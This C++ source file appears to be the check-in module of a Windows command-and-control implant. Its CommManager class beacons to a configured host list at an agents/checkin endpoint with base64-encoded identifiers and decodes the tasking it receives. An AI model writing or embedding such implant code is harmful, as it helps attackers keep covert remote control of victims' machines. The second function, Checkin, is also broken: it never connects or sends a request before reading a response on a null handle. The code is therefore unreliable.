//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

#include "CommManager.h"
#include "base64.hpp"

#include <iostream>
#include <thread>
#include <chrono>
#include <windows.h>
#include <winhttp.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

#define WIDE_PREFIX_HELPER(x) L##x
#define TO_WIDE_STRING(x) WIDE_PREFIX_HELPER(x)

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor
CommManager::CommManager()
{
	const std::vector<std::wstring> hosts = { COMM_HOSTS_LIST };
	payloadUUID = COMM_PAYLOAD_UUID;
	if (!hosts.empty())
	{
		host = hosts.front();
	}
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Initial checkin
void CommManager::IntialCheckin(const std::string& json)
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    DWORD dwOptionalLength = 0;

    std::string strData;
    std::string responseData;

    BOOL bResults = FALSE;
    LPVOID lpOptional = NULL;

    hSession = WinHttpOpen(
        TO_WIDE_STRING(COMM_USER_AGENT),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
        goto e_func;

    hConnect = WinHttpConnect(
        hSession,
        host.c_str(),
        COMM_PORT,
        0);

    if (!hConnect)
        goto e_func;

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/api/v1/agents/checkin",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    if (!hRequest)
        goto e_func;

    strData = base64::to_base64(payloadUUID + json);

    lpOptional = (LPVOID)strData.c_str();
    dwOptionalLength = static_cast<DWORD>(strData.length());

    bResults = WinHttpSendRequest(
        hRequest,
        TO_WIDE_STRING("Content-Type: application/json"),
        (DWORD)-1L,
        lpOptional,
        dwOptionalLength,
        dwOptionalLength,
        0);

    if (!bResults)
        goto e_func;

    if (WinHttpReceiveResponse(hRequest, NULL))
    {
        std::vector<char> buffer;

        do
        {
            dwSize = 0;

            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                std::cerr
                    << "[x] Error "
                    << GetLastError()
                    << " in WinHttpQueryDataAvailable.\n";

                goto e_func;
            }

            if (dwSize == 0)
                break;

            std::vector<char> chunk(dwSize);

            if (!WinHttpReadData(
                    hRequest,
                    chunk.data(),
                    dwSize,
                    &dwDownloaded))
            {
                std::cerr
                    << "[x] Error "
                    << GetLastError()
                    << " in WinHttpReadData.\n";

                goto e_func;
            }

            buffer.insert(
                buffer.end(),
                chunk.begin(),
                chunk.begin() + dwDownloaded);

        } while (dwSize > 0);

        if (buffer.empty())
            goto e_func;

        responseData.assign(buffer.begin(), buffer.end());

        callbackUUID = base64::from_base64(responseData);
    }

e_func:
    if (hRequest)
        WinHttpCloseHandle(hRequest);

    if (hConnect)
        WinHttpCloseHandle(hConnect);

    if (hSession)
        WinHttpCloseHandle(hSession);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Full-established checkin
std::string CommManager::Checkin(const std::string& json)
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    DWORD dwOptionalLength = 0;

    std::string result;
    std::string strData;

    BOOL bResults = FALSE;
    LPVOID lpOptional = NULL;

    hSession = WinHttpOpen(
        TO_WIDE_STRING(COMM_USER_AGENT),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
        goto e_func;

	if (WinHttpReceiveResponse(hRequest, NULL))
	{
		std::vector<char> totalResponse; // Persistent container for all chunks
		std::vector<char> chunkBuffer;   // Temporary container for each chunk

		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
			if (dwSize == 0) break;

			// Prepare temporary buffer for this chunk
			chunkBuffer.resize(dwSize);
			dwDownloaded = 0;

			if (!WinHttpReadData(hRequest, chunkBuffer.data(), dwSize, &dwDownloaded)) break;

			// Append only the bytes that were actually downloaded, ignoring uninitialized padding
			if (dwDownloaded > 0) {
				totalResponse.insert(totalResponse.end(), chunkBuffer.begin(), chunkBuffer.begin() + dwDownloaded);
			}

		} while (dwSize > 0);

		if (totalResponse.empty()) goto e_func;

		// Convert the validated binary data into a string and decode base64
		result = base64::from_base64(std::string(totalResponse.begin(), totalResponse.end()));
	}


e_func:
    if (hRequest)
        WinHttpCloseHandle(hRequest);

    if (hConnect)
        WinHttpCloseHandle(hConnect);

    if (hSession)
        WinHttpCloseHandle(hSession);

    if (result.rfind(callbackUUID, 0) == 0)
        result.erase(0, callbackUUID.length());

    return result;
}


//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//